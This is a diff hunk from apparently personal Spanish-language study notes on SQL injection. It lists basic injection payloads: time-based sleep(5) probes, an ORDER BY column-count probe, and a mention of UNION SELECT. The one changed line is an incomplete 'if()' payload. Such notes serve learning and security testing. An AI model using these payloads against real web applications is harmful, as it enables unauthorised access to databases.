@@ -49,7 +49,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
-❯ ' and if()-- -
+❯ ' and if()-- a                                      
 ```
 
 Después de saber cuantas columnas existen podemos usar Union Select para meter un data en ese columna, esperando a que también esa columna acepte datos. Aquí tendríamos un ejemplo de que existen 3 columnas. Pero pueden ser mas o menos, dependiendo la DB.
